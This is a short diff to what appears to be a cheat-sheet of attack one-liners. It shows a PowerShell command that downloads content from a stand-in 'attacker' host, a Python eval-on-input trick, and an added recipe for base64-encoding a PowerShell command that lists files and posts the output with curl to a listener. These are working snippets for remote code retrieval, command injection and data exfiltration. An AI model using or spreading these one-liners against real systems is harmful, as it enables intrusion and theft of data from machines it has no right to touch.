@@ -27,3 +27,6 @@ print(eval(input("input:").replace('CHAR','chr')))
 
 # win7 curl
 powershell "$client=New-Object System.Net.WebClient;$c=$client.DownloadString('http://attacker/xxx.txt');write-host -NoNewline $c"
+
+# powershell base64
+echo -n '$r=cmd /c "dir /b";cmd /c curl 127.0.0.1:8877 --data "$r"' | iconv -f UTF-8 -t UTF-16LE | base64
